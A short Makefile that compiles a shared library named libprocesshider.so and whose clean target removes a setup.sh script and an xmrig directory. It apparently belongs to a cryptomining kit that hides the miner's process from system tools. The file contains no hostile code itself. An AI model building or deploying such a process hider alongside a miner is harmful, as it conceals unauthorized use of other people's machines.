all: libprocesshider.so

libprocesshider.so: processhider.c
	gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

.PHONY clean:
	rm -f libprocesshider.so
	rm -f setup.sh
	rm -f -r xmrig
